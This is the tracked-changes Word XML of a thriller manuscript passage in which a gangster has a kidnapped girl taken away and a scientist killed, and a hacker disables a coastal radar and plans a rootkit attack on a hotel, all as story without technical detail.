            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">whistle </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2635" w:author="TextVet" w:date="2016-03-25T09:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00852F20">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">piercing </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2636" w:author="TextVet" w:date="2016-03-25T09:28:00Z">
        <w:r w:rsidR="00852F20">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>cry</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2637" w:author="TextVet" w:date="2016-03-25T09:28:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00852F20">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>voice</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> rang out</w:t>
      </w:r>
      <w:del w:id="2638" w:author="TextVet" w:date="2016-03-25T09:28:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00852F20">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> like a</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2639" w:author="TextVet" w:date="2016-03-25T09:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00852F20">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> steam whistle</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, slicing through the room like a storm of razors.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crossed his arms and laughed</w:t>
      </w:r>
      <w:ins w:id="2640" w:author="TextVet" w:date="2016-03-25T09:28:00Z">
        <w:r w:rsidR="00852F20">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2641" w:author="TextVet" w:date="2016-03-25T09:29:00Z">
        <w:r w:rsidR="00C5541E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">with </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2642" w:author="TextVet" w:date="2016-03-25T09:28:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00852F20">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>. It was</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2643" w:author="TextVet" w:date="2016-03-25T09:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C5541E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> a </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">dry, hacking </w:t>
      </w:r>
      <w:ins w:id="2644" w:author="TextVet" w:date="2016-03-25T09:30:00Z">
        <w:r w:rsidR="000C6391">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>rasps</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2645" w:author="TextVet" w:date="2016-03-25T09:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C5541E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sound</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Little angel!” he said when her screaming faded. “Do you think anyone can hear you? Look around! Rooms like these are built for rock stars! There’s two meters of soundproofing under this floor. You could throw a dance party with a thousand people, and nobody would hear a thing downstairs. A grenade could go off, and people below would just think we’re watching a movie.”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English, she sneered, “When my Daddy gets here, you are so fucked.”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At this, Ivan burst into haughty laughter. “Your ‘Daddy?’” he replied with a heavy accent. “You know what happen before, when your ‘Daddy’ dance with me?” Switching back to Russian, he commanded, “Take her upstairs! She’ll need time to, shall we say, fully comprehend her new circumstances. Keep an eye on her tonight. We’ll take her back to St. Petersburg tomorrow. Then we can properly begin her ‘education</w:t>
      </w:r>
      <w:ins w:id="2646" w:author="TextVet" w:date="2016-03-25T09:32:00Z">
        <w:r w:rsidR="005C3E56">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w:t>
      </w:r>
      <w:del w:id="2647" w:author="TextVet" w:date="2016-03-25T09:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005C3E56">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thug holding her nodded </w:t>
      </w:r>
      <w:del w:id="2648" w:author="TextVet" w:date="2016-03-25T09:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BD3F7F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>compl</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2649" w:author="TextVet" w:date="2016-03-25T09:33:00Z">
        <w:r w:rsidR="00BD3F7F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>dutifu</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2650" w:author="TextVet" w:date="2016-03-25T09:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BD3F7F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>iant</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2651" w:author="TextVet" w:date="2016-03-25T09:33:00Z">
        <w:r w:rsidR="00BD3F7F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ly, and dragged her bucking, kicking, wriggling body up the wide spiral staircase, until her shouts and barks of protest faded somewhere in the carpeted hallways overhead.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When they were gone, Ivan spun to face the living room, and clapped his hands. He flashed Dr. Passinsky a crocodile smile. “Now then. Petya! It’s good to see you! I take it you’ve been able to resolve that little dilemma from this morning?”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nodded. He reached into his pocket, and produced the vial.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took it in his coarse hand and chuckled, looking eye to eye with the smiley face sticker on its side. “Such a small thing, yet a cause of so much fuss!”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is the product of years of research,” said Passinsky.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 cultivation instructions?” Ivan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“I’ve emailed you documents on proper incubation procedures and optimal yield formulas,” said Passinsky. “This bacterial strain appears to be particularly hardy and will probably thrive even in poorly calibrated incubation environments.”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smirked. “Thank you, Petya. You have done well.”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shrugged off the praise. “Have you had a chance to speak with Tungsten’s former creditors?”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for?” Ivan said casually.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“What do you mean, ‘what for?’” Passinsky </w:t>
      </w:r>
      <w:ins w:id="2652" w:author="TextVet" w:date="2016-03-25T09:34:00Z">
        <w:r w:rsidR="006174FE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>reflexe</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2653" w:author="TextVet" w:date="2016-03-25T09:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006174FE">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 and instantly regretted it. “At the risk of sounding impertinent, sir… I was under the impression that the whole purpose of your visit was to discuss the recent reinstatement of Tungsten’s debts.”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eyed the vial in his hand. “That hardly matters anymore.”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doesn’t matter?” Passinsky asked suspiciously.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have what I need,” Ivan said with a shrug, and placed the vial in his chest pocket.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I’m afraid I don’t understand. What will happen to Tungsten?”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hostile takeover will succeed,” Ivan said. “Whoever wants this company, they can have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 equipment? And the staff?” Passinsky demanded. “And </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>me</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“Auctioned. Disbanded. And…” Ivan gave a wide, uncaring shrug. “Eh.”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 had an agreement!” Passinsky insisted hoarsely.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“Did we now?” Ivan said with a smirk.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Passinsky’s thin lips curled downward. “Do you think I work for you because I enjoy gazing upon your face?” One look at Ivan’s eyes, and Passinsky knew he was treading on very dangerous ground. “Forgive me, sir. I didn’t mean to be rude. But as a businessman, I’m sure you understand that our arrangement was supposed to further my own interests as well as yours. I have personal theories about the functioning of the brain that I’ve been waiting for </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>decades</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> to put to the test. At the Russian Academy of Sciences, my objectives were continuously sidelined by whatever pseudoscientific fixation captured the Politburo’s momentary attention. In the ’60s, it was Lysenkoism. Polywater in the ’70s. Telekinesis in the ’80s. And now, with the Soviet Union dissolved, my sole access to equipment and personnel lies in the private sector — which, in today’s Russia, means doing business with… gentlemen such as yourself. So, let there be no mistake. Your project was an intriguing diversion. But my labor for you was contingent on the understanding that, once I completed your R&amp;D goals — which I have! — then you would grant me full control of the laboratory with uninterrupted funding for the remainder of my lifetime.”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replied condescendingly, “Well, that’s just it, Petya. It appears that your life simply won’t be all that long.”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I expect I have many good years left in me yet. I’ve maintained a strict nutritional—”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stopped abruptly at the sensation of someone’s breath blowing down the hairs on the back of his neck. One of Ivan’s soldiers was standing behind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 shame,” Ivan said, shaking his head. “That terrible accident you had this afternoon.”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Every muscle in Passinsky’s old body tensed as realization dawned.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man your age really should be careful going down the stairs,” Ivan said. “So easy to fall and break your neck.”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opened his mouth to offer a response. He never got the chance.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strong hand reached over Passinsky’s shoulder, grabbed his chin, and pulled. Another hand pushed the back of his head in the opposite direction.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commentRangeStart w:id="2654"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>It occurred to Passinsky that this would be a serious setback for his research</w:t>
      </w:r>
      <w:commentRangeEnd w:id="2654"/>
      <w:r w:rsidR="00E74D52">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2654"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>26</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Beneath a star-filled sky, Jason’s yacht</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> rocked gently on wind-driven waves. “Can you make the boat hold still?” Danny insisted.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“It’s on water. It’s as still as it’s going to </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2655" w:author="TextVet" w:date="2016-03-25T09:39:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">,” </w:t>
      </w:r>
      <w:del w:id="2656" w:author="TextVet" w:date="2016-03-25T09:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BF1D9E">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 xml:space="preserve">Jason </w:t>
      </w:r>
      <w:ins w:id="2657" w:author="TextVet" w:date="2016-03-25T09:38:00Z">
        <w:r w:rsidR="00BF1D9E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">countered </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>from the helm. “Can you even hit anything from all the way out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yeah,” Danny replied as he braced his HERF gun against the yacht’s handrail. “I can boost the gain up to thirty decibels. Those Coast Guard radar stations along the shore? I can knock them out from half a mile away. But boosting tightens the beam, so I need to line it up just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Out past the HERF gun’s nozzle, across the</w:t>
      </w:r>
      <w:del w:id="2658" w:author="TextVet" w:date="2016-03-25T09:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00240DCE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> the</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> moonlit water, </w:t>
      </w:r>
      <w:del w:id="2659" w:author="TextVet" w:date="2016-03-25T09:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A471E3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">there </w:delText>
        </w:r>
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B931B8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">spread </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the steep tree-lined banks of the Medina waterfront</w:t>
      </w:r>
      <w:ins w:id="2660" w:author="TextVet" w:date="2016-03-25T09:40:00Z">
        <w:r w:rsidR="00B931B8" w:rsidRPr="00B931B8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="00B931B8" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>spread</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. And over that waterfront, dwarfing the personal mansions of tech tycoons, rose the twelve-story edifice of the Medina Gallante. Its windows formed checkerboard patterns of iridescent green. Cobblestone pillars buttressed cedar balcony awnings. At the base of the hotel, a private wharf jutted out into the lake.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is exactly what this device is designed for,” Danny explained as he made adjustments. “I built it during Claymore’s contract with Naval Base Kitsap. I told the Navy they needed to harden their electronics against directed electromagnetic pulses. They laughed and said that EMPs are, um, ‘sci-fi hootenanny’, were their exact words. Well, I told them, ‘Give me a high-power magnetron, and I’ll show you hootenanny.’ They did, just to humor me. And when I came back and demonstrated this device to prove my point, they were surprisingly displeased…”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t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>that’s</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> what happened to the Kitsap contract,” Jason said. “You know, the investment board never got a straight answer from you about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“Yeah, well. My point is, the Coast Guard’s radar systems are the same kind as the Navy’s. Somewhere along that shoreline, there’s an automated radar station watching this stretch of water. It’s a plastic dome, about the size of a beach ball, painted to look like a rock. It’s sweeping the area with a 5-degree beam at 2.8 gigahertz…” He pulled the trigger. “…And now it’s not.”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asked, “That’s it? Just like that, the Coast Guard’s radar is down?”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“Fried to a crisp. They’ll no doubt send a repair crew in the morning. But tonight, the sea is ours.”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“Alright then. I’ll take her in. Slowly. You go update the team.” Jason tapped the controls of the cherrywood console. A vibration quaked across the yacht. Water burbled behind the vessel.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made his way across topside, and descended the stairs to the wood-paneled compartment where he had first met Mike and Moshen playing </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Dungeons &amp; Dragons</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> the previous day. Upon the lacquered table sat several laptops, their screens showing floor plans, emails, and code. Freshly purchased cellphones and Bluetooth headsets lay on the leather bench</w:t>
      </w:r>
      <w:ins w:id="2661" w:author="TextVet" w:date="2016-03-25T14:15:00Z">
        <w:r w:rsidR="00451F82">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>e</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2662" w:author="TextVet" w:date="2016-03-25T14:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00451F82">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> seat</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w: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television on the room’s rear wall displayed the faces of Danny’s teammates in neatly tiled teleconference windows. In one corner, he could see Tina tending to glassware in his kitchen. Mike and Natalie shared a feed from the hospital room, and bantered in obnoxiously cute tones. A small icon represented Moshen, available only by voice.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“Guys,” Danny announced. “It’s happening.”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responded, “I’m ready to probe their network as soon as you open a back door. Did you finish the trojan?”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held up a USB thumb drive, and nodded. “</w:t>
      </w:r>
      <w:ins w:id="2663" w:author="TextVet" w:date="2016-03-25T14:18:00Z">
        <w:r w:rsidR="00696333">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>P</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2664" w:author="TextVet" w:date="2016-03-25T14:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00696333">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>While p</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>oking through the RockBox source code, I found a weakness in the integration of their billing system. It was built by a different contractor than the security system. By themselves, both billing and security are pretty solid. But their connection is sloppy. I managed to write a rootkit that exploits the flaw. As soon as this program runs on a computer that accesses the Gallante’s billing system, we take complete control.”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“But how do you plan to get that rootkit onto one of their computers in the first place?” asked Mike. “Remote access is not an option — you won’t be able to get it past their network firewall.”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figured as much,” said Danny. “That’s why I plan on checking out the Gallante’s fine dining establishments.”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person? Danny, you’ll be on your own in there at first. We can’t help you until that trojan is deployed. You’ll have to stay out of sight.”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“Don’t worry. I’ve got that covered. I went and got myself…”</w:t>
      </w:r>
      <w:ins w:id="2665" w:author="TextVet" w:date="2016-03-25T14:20:00Z">
        <w:r w:rsidR="00EE011E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2666" w:author="TextVet" w:date="2016-03-25T14:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EE011E">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He held up a laundry bag</w:t>
      </w:r>
      <w:r w:rsidR="00EE011E">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EE011E" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a brown shirtsleeve </w:t>
      </w:r>
      <w:r w:rsidR="00667E14">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
